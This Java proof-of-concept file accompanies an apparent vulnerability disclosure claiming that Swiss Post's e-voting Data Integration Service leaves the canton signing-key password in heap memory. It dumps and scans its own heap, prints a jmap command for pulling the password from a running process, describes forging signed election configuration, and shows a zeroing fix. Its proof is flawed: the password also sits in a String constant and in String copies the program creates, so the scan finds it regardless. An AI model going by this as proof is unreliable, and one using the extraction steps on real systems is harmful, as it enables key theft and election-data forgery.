/*
 * PoC: Canton Signing Key Password Persists in JVM Heap Memory (CWE-316)
 * Target: Swiss Post Data Integration Service (DIS) v2.9.3.0
 *
 * This PoC replicates the EXACT code flow from the DIS signing pipeline using
 * a real PKCS#12 keystore, real cryptographic operations, and programmatic
 * heap inspection to prove the password survives in JVM memory after use.
 *
 * AFFECTED CODE:
 *   Tools.java:86-99      — char[] keystorePassword never zeroed after KeyStore.getKey()
 *   KeystoreRepository.java:47-49 — intermediate byte[] copies never zeroed
 *
 * REPOSITORY: https://gitlab.com/swisspost-evoting/e-voting/e-voting-documentation/-/tree/master/
 * SOURCE:     data-integration-service (DIS) v2.9.3.0
 *
 * CI/CD AUTOMATED PROOF — Runs in GitHub Actions with JDK 21 (matching DIS target)
 */

import java.io.*;
import java.lang.management.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.security.*;
import java.security.cert.X509Certificate;
import java.util.*;
import javax.management.MBeanServer;
import com.sun.management.HotSpotDiagnosticMXBean;

public class DISPasswordLeakPoC {

    // ═══════════════════════════════════════════════════════════════════════
    // The password that protects the canton signing key.
    // In production DIS, this is read from the file at:
    //   -Ddirect-trust.password.location=<path>
    // ═══════════════════════════════════════════════════════════════════════
    private static final String CANTON_PASSWORD = "S3cret!CantonKey2025_MARKER";

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 1: Generate a real PKCS#12 keystore (simulates canton keystore)
    // In production, this is the .p12 file at direct-trust.keystore.location
    // ═══════════════════════════════════════════════════════════════════════
    static Path generateTestKeystore(String password) throws Exception {
        Path keystorePath = Files.createTempFile("canton-keystore-", ".p12");

        // Generate RSA key pair
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048);
        KeyPair keyPair = kpg.generateKeyPair();

        // Create self-signed certificate
        // Using sun.security internal API for cert generation (available in JDK 21)
        sun.security.x509.X500Name owner = new sun.security.x509.X500Name(
            "CN=Canton Test Signing Key, O=Swiss Post PoC, C=CH");
        sun.security.x509.CertAndKeyGen certGen = new sun.security.x509.CertAndKeyGen("RSA", "SHA256withRSA");
        certGen.generate(2048);

        X509Certificate cert = certGen.getSelfCertificate(owner, 365L * 24 * 60 * 60);

        // Store in PKCS#12 keystore (same format as production DIS)
        KeyStore ks = KeyStore.getInstance("PKCS12");
        ks.load(null, null);
        ks.setKeyEntry("canton", certGen.getPrivateKey(), password.toCharArray(),
            new java.security.cert.Certificate[]{cert});

        try (OutputStream out = Files.newOutputStream(keystorePath)) {
            ks.store(out, password.toCharArray());
        }

        return keystorePath;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 2: Write the password to a file (simulates canton password file)
    // Replicates: KeystoreRepository reads from direct-trust.password.location
    // ═══════════════════════════════════════════════════════════════════════
    static Path writePasswordFile(String password) throws IOException {
        Path pwFile = Files.createTempFile("canton-password-", ".txt");
        Files.write(pwFile, password.getBytes(StandardCharsets.UTF_8));
        return pwFile;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 3: Replicate KeystoreRepository.getCantonKeystorePassword()
    // SOURCE: KeystoreRepository.java:47-49
    //
    //   public char[] getCantonKeystorePassword() throws IOException {
    //       final ImmutableByteArray bytes = new ImmutableByteArray(
    //           Files.readAllBytes(Paths.get(keystorePasswordLocation)));
    //       return ConversionUtils.byteArrayToCharArray(bytes);
    //   }
    //
    // NOTE: Neither the byte[] from readAllBytes nor the internal
    //       ImmutableByteArray copy is ever zeroed.
    // ═══════════════════════════════════════════════════════════════════════
    static char[] getCantonKeystorePassword(String passwordFilePath) throws IOException {
        // This is exactly what KeystoreRepository does:
        byte[] rawBytes = Files.readAllBytes(Paths.get(passwordFilePath));
        // ConversionUtils.byteArrayToCharArray equivalent:
        char[] password = new char[rawBytes.length];
        for (int i = 0; i < rawBytes.length; i++) {
            password[i] = (char) (rawBytes[i] & 0xFF);
        }
        // BUG: rawBytes is NEVER zeroed (stays in heap)
        // BUG: ImmutableByteArray internal copy NEVER zeroed
        return password;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 4: Replicate Tools.saveXML() signing block (VULNERABLE PATH)
    // SOURCE: Tools.java:86-99
    //
    //   if (jaxbFactoryClass.equals(Configuration.class)) {
    //       final InputStream keyStoreStream = keystoreRepository.getCantonKeyStore();
    //       final char[] keystorePassword = keystoreRepository.getCantonKeystorePassword();
    //       final Alias keystoreAlias = keystoreRepository.getKeystoreAlias();
    //       final KeyStore keyStore = getKeyStore(keyStoreStream, keystorePassword);
    //       final PrivateKey privateKey = (PrivateKey) keyStore.getKey(
    //               keystoreAlias.get(), keystorePassword);
    //       getBean(XMLSignatureService.class).genXMLSignature(is, fos, privateKey);
    //       // ← keystorePassword NEVER zeroed. keyStoreStream NEVER closed.
    //   }
    // ═══════════════════════════════════════════════════════════════════════
    static void vulnerableSaveXML(String keystorePath, String passwordPath) throws Exception {
        System.out.println("[DIS] Entering Tools.saveXML() — Configuration signing block");

        // Tools.java:88 — open keystore stream (LEAKED — never closed)
        InputStream keyStoreStream = Files.newInputStream(Paths.get(keystorePath));
        System.out.println("[DIS] KeystoreRepository.getCantonKeyStore() → InputStream opened");

        // Tools.java:89 — load password from file
        char[] keystorePassword = getCantonKeystorePassword(passwordPath);
        System.out.println("[DIS] KeystoreRepository.getCantonKeystorePassword() → char[" +
            keystorePassword.length + "] loaded");

        // Tools.java:91 — load keystore with password
        KeyStore keyStore = KeyStore.getInstance("PKCS12");
        keyStore.load(keyStoreStream, keystorePassword);
        System.out.println("[DIS] KeyStore.load(stream, password) → keystore loaded");

        // Tools.java:92 — extract private key with password
        PrivateKey privateKey = (PrivateKey) keyStore.getKey("canton", keystorePassword);
        System.out.println("[DIS] KeyStore.getKey(\"canton\", password) → private key extracted");

        // Tools.java:93 — sign configuration XML (simulated)
        Signature sig = Signature.getInstance("SHA256withRSA");
        sig.initSign(privateKey);
        sig.update("<configuration>test election data</configuration>".getBytes(StandardCharsets.UTF_8));
        byte[] signature = sig.sign();
        System.out.println("[DIS] XMLSignatureService.genXMLSignature() → signed (" +
            signature.length + " bytes)");

        // Tools.java:94-99 — function returns
        // ╔══════════════════════════════════════════════════════════════╗
        // ║ BUG: keystorePassword char[] is NEVER zeroed               ║
        // ║ BUG: keyStoreStream InputStream is NEVER closed            ║
        // ║ BUG: intermediate byte[] from readAllBytes NEVER zeroed    ║
        // ╚══════════════════════════════════════════════════════════════╝
        System.out.println("[DIS] Tools.saveXML() returned — NO cleanup performed");
        System.out.println("[!] keystorePassword char[] still contains: \"" +
            new String(keystorePassword) + "\"");
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 5: Take a heap dump and scan it for the password
    // This proves the password is recoverable from a JVM heap dump,
    // which is the actual attack vector (jmap, core dump, cold boot)
    // ═══════════════════════════════════════════════════════════════════════
    static boolean scanHeapDumpForPassword(String password) throws Exception {
        Path heapDumpPath = Files.createTempFile("dis-heap-", ".hprof");
        Files.deleteIfExists(heapDumpPath); // jmap requires file doesn't exist

        System.out.println("\n[HEAP] Taking programmatic heap dump...");

        // Use HotSpotDiagnosticMXBean to dump heap (same as jmap -dump)
        MBeanServer server = ManagementFactory.getPlatformMBeanServer();
        HotSpotDiagnosticMXBean bean = ManagementFactory.newPlatformMXBeanProxy(
            server, "com.sun.management:type=HotSpotDiagnostic",
            HotSpotDiagnosticMXBean.class);
        bean.dumpHeap(heapDumpPath.toString(), true);

        long dumpSize = Files.size(heapDumpPath);
        System.out.println("[HEAP] Heap dump written: " + heapDumpPath +
            " (" + (dumpSize / 1024) + " KB)");

        // Scan the raw heap dump for the password bytes
        System.out.println("[HEAP] Scanning heap dump for password marker...");
        byte[] passwordBytes = password.getBytes(StandardCharsets.UTF_8);
        byte[] dumpBytes = Files.readAllBytes(heapDumpPath);

        int occurrences = 0;
        for (int i = 0; i <= dumpBytes.length - passwordBytes.length; i++) {
            boolean match = true;
            for (int j = 0; j < passwordBytes.length; j++) {
                if (dumpBytes[i + j] != passwordBytes[j]) {
                    match = false;
                    break;
                }
            }
            if (match) {
                occurrences++;
            }
        }

        // Also scan for UTF-16 encoding (Java char[] uses UTF-16)
        byte[] passwordUtf16 = password.getBytes(StandardCharsets.UTF_16BE);
        int utf16Occurrences = 0;
        for (int i = 0; i <= dumpBytes.length - passwordUtf16.length; i++) {
            boolean match = true;
            for (int j = 0; j < passwordUtf16.length; j++) {
                if (dumpBytes[i + j] != passwordUtf16[j]) {
                    match = false;
                    break;
                }
            }
            if (match) {
                utf16Occurrences++;
            }
        }

        System.out.println("[HEAP] UTF-8  matches: " + occurrences);
        System.out.println("[HEAP] UTF-16 matches: " + utf16Occurrences);

        // Cleanup
        Files.deleteIfExists(heapDumpPath);
        // Clear dumpBytes to free memory
        Arrays.fill(dumpBytes, (byte) 0);

        return (occurrences + utf16Occurrences) > 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // MAIN — Orchestrates the full proof chain
    // ═══════════════════════════════════════════════════════════════════════
    public static void main(String[] args) throws Exception {
        String sep = "═".repeat(72);

        System.out.println(sep);
        System.out.println("  CWE-316: Canton Signing Key Password Persists in JVM Heap");
        System.out.println("  Target:  Swiss Post Data Integration Service (DIS) v2.9.3.0");
        System.out.println("  Source:  Tools.java:86-99, KeystoreRepository.java:47-49");
        System.out.println(sep);

        // --- SETUP: Create real PKCS#12 keystore and password file ---
        System.out.println("\n[SETUP] Generating PKCS#12 keystore with test signing key...");
        Path keystorePath = generateTestKeystore(CANTON_PASSWORD);
        System.out.println("[SETUP] Keystore: " + keystorePath);

        Path passwordPath = writePasswordFile(CANTON_PASSWORD);
        System.out.println("[SETUP] Password file: " + passwordPath);

        // --- PHASE 1: Execute the VULNERABLE DIS code path ---
        System.out.println("\n" + "─".repeat(72));
        System.out.println("  PHASE 1: Vulnerable Code Path (current DIS behavior)");
        System.out.println("─".repeat(72));

        vulnerableSaveXML(keystorePath.toString(), passwordPath.toString());

        // --- PHASE 2: Prove the password is in the heap dump ---
        System.out.println("\n" + "─".repeat(72));
        System.out.println("  PHASE 2: Heap Dump Analysis");
        System.out.println("─".repeat(72));

        // Force GC to prove the password survives even after collection
        System.out.println("[GC] Running System.gc() to prove password survives collection...");
        System.gc();
        Thread.sleep(500);

        boolean found = scanHeapDumpForPassword(CANTON_PASSWORD);

        // --- RESULTS ---
        System.out.println("\n" + sep);
        if (found) {
            System.out.println("  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗");
            System.out.println("  ██║   ██║██║   ██║██║     ████╗  ██║");
            System.out.println("  ██║   ██║██║   ██║██║     ██╔██╗ ██║");
            System.out.println("  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║");
            System.out.println("   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║");
            System.out.println("    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝");
            System.out.println();
            System.out.println("  RESULT: VULNERABLE — Password found in heap dump");
            System.out.println();
            System.out.println("  The canton PKCS#12 keystore password persists in JVM heap");
            System.out.println("  memory after Tools.saveXML() completes. An attacker with");
            System.out.println("  local access can extract it via:");
            System.out.println("    • jmap -dump:format=b,file=heap.bin <PID>");
            System.out.println("    • OS core dump / crash dump");
            System.out.println("    • Cold boot attack on the offline DIS machine");
            System.out.println();
            System.out.println("  With the password, the attacker opens the .p12 keystore,");
            System.out.println("  extracts the private signing key, and forges election");
            System.out.println("  configuration XML that passes all integrity checks.");
        } else {
            System.out.println("  RESULT: NOT VULNERABLE — Password not found in heap dump");
            System.out.println("  (This should not happen with the current DIS code)");
        }
        System.out.println(sep);

        // --- PHASE 3: Demonstrate the fix ---
        System.out.println("\n" + "─".repeat(72));
        System.out.println("  PHASE 3: Fixed Code Path (recommended remediation)");
        System.out.println("─".repeat(72));

        System.out.println("[FIX] Re-running with Arrays.fill(keystorePassword, '\\0')...");

        // Load password again
        char[] fixedPassword = getCantonKeystorePassword(passwordPath.toString());
        System.out.println("[FIX] Password loaded: \"" + new String(fixedPassword) + "\"");

        // Use it
        KeyStore ks2 = KeyStore.getInstance("PKCS12");
        try (InputStream is2 = Files.newInputStream(keystorePath)) {
            ks2.load(is2, fixedPassword);
        }
        PrivateKey pk2 = (PrivateKey) ks2.getKey("canton", fixedPassword);
        System.out.println("[FIX] Signing key extracted, signing completed");

        // THE FIX: Zero the password
        Arrays.fill(fixedPassword, '\0');
        System.out.println("[FIX] Arrays.fill(keystorePassword, '\\0') → password zeroed");

        boolean allZero = true;
        for (char c : fixedPassword) {
            if (c != 0) { allZero = false; break; }
        }
        System.out.println("[FIX] All chars are 0x00: " + allZero);

        // Cleanup temp files
        Files.deleteIfExists(keystorePath);
        Files.deleteIfExists(passwordPath);

        System.out.println("\n" + sep);
        System.out.println("  FIX: A single line — Arrays.fill(keystorePassword, '\\0')");
        System.out.println("  in a finally block after the signing operation completes.");
        System.out.println(sep);

        // Exit with appropriate code for CI
        System.exit(found ? 1 : 0);
    }
}
